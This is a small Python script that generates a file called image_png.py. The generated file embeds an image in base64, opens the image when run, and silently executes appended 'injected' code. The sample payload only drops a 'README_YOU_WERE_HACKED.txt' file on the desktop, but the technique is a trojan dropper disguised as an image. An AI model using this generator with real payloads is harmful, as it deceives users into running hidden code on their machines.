#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "ipetrash"


import base64
from PIL import Image


# SOURCE: https://github.com/gil9red/SimplePyScripts/blob/7cebedb16a5ac81333ebf62af410fdb53a690d29/convert_image_to_ico/main.py
def convert_image_to_ico(file_name, file_name_ico, icon_sizes=None):
    img = Image.open(file_name)

    if icon_sizes:
        img.save(file_name_ico, sizes=icon_sizes)
    else:
        img.save(file_name_ico)


FILE_NAME = "image_png.py"


# SOURCE: https://github.com/gil9red/SimplePyScripts/blob/aec64c1749d4f6f3176e3222c7e7c554f40c693f/generator_py_with_inner_image_with_open/main.py
def generate(file_name, inject_code: str):
    with open(file_name, "rb") as f:
        img_bytes = f.read()

    img_base64 = base64.b64encode(img_bytes).decode("utf-8")

    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write("""\
#!/usr/bin/env python3
# -*- coding: utf-8 -*-


FILE_NAME_IMAGE = "{}"
IMAGE = "{}"

import base64
img_bytes = base64.b64decode(IMAGE)

def save_and_run():
    import os
    import tempfile
    
    NEW_FILE_NAME = os.path.join(tempfile.gettempdir(), FILE_NAME_IMAGE)
        
    # Save file
    with open(NEW_FILE_NAME, 'wb') as f:
        f.write(img_bytes)
    
    os.startfile(NEW_FILE_NAME)

save_and_run()

# INJECTED CODE
{}
""".format(file_name, img_base64, inject_code))


if __name__ == "__main__":
    file_name = "image.jpg"
    inject_code = """
import os.path
from pathlib import Path

file_name = Path(os.path.expanduser("~/Desktop")).resolve() / "README_YOU_WERE_HACKED.txt"
file_name.touch(exist_ok=True)
    """

    # # Save to ico
    # convert_image_to_ico(file_name, 'icon.ico', icon_sizes=[(16, 16), (32, 32), (48, 48), (64, 64)])

    generate(file_name, inject_code)

    # # Test image_png
    # import image_png
    # image_png.save_and_run()
